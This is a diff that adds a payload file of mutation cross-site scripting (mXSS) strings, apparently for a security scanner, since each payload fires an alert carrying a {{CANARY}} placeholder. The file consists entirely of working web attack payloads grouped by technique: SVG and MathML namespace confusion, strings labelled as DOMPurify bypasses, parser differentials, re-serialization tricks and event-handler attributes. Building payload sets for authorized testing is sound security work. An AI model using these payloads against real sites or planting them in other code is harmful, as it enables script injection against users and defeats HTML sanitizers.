@@ -1,0 +1,33 @@
+# Mutation XSS (mXSS) Payloads
+# Exploit browser HTML parser re-serialization quirks
+
+# === Namespace Confusion (math/svg/foreignObject) ===
+<math><mtext><table><mglyph><style><!--</style><img src=x onerror=alert('{{CANARY}}')>
+<svg><foreignObject><body onload=alert('{{CANARY}}')></foreignObject></svg>
+<math><mi><table><mglyph><style><!--</style><img src=x onerror=alert('{{CANARY}}')>
+<svg><desc><body onload=alert('{{CANARY}}')></desc></svg>
+<svg><title><body onload=alert('{{CANARY}}')></title></svg>
+
+# === DOMPurify Bypasses ===
+<math><mtext><table><mglyph><style><img src=x onerror=alert('{{CANARY}}')>
+<form><math><mtext><form><mglyph><svg><mtext><textarea><path id="</textarea><img src=x onerror=alert('{{CANARY}}')>">
+<svg></p><style><a id="</style><img src=x onerror=alert('{{CANARY}}')>">
+
+# === Parser Differential ===
+<listing>&lt;img src=1 onerror=alert('{{CANARY}}')&gt;</listing>
+<noscript><p title="</noscript><img src=x onerror=alert('{{CANARY}}')>">
+<xmp><p title="</xmp><img src=x onerror=alert('{{CANARY}}')>">
+
+# === Re-serialization Mutations ===
+<svg><style><img src="</style><img src=x onerror=alert('{{CANARY}}')>">
+<div id="x"><style><a href="</style><img src=x onerror=alert('{{CANARY}}')>">
+<table><colgroup><col style=""><img src=x onerror=alert('{{CANARY}}')>
+
+# === Template/Custom Element Abuse ===
+<template><img src=x onerror=alert('{{CANARY}}')></template>
+<slot><img src=x onerror=alert('{{CANARY}}')></slot>
+
+# === Attribute Mutation ===
+<p style="animation:x" onanimationend=alert('{{CANARY}}')>
+<p style="transition:all 0s" ontransitionend=alert('{{CANARY}}')>
+<div contenteditable onblur=alert('{{CANARY}}') onfocus=alert('{{CANARY}}') tabindex=1>click</div>
